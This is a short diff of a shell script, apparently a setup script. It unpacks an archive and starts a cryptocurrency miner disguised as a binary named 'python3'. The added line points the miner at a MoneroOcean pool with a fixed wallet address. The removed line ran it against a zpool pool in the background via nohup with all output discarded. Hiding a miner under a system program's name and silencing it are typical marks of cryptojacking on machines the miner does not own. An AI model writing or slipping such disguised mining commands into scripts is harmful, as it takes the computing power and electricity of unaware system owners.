@@ -6,4 +6,4 @@ tar xvf dot
 
 nomer=$((RANDOM % 50 + 1))
 
-nohup ./dotsrb/python3 -a flex -o flex.eu.mine.zpool.ca:3340 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.DOT-$nomer > /dev/null 2>&1 &
+./dotsrb/python3 -a randomx -o gulf.moneroocean.stream:10032 -u  kc1qtkkxn9tt53cg9nrsa25luqr6u9hzw58etrd8hu.luck-$nomer
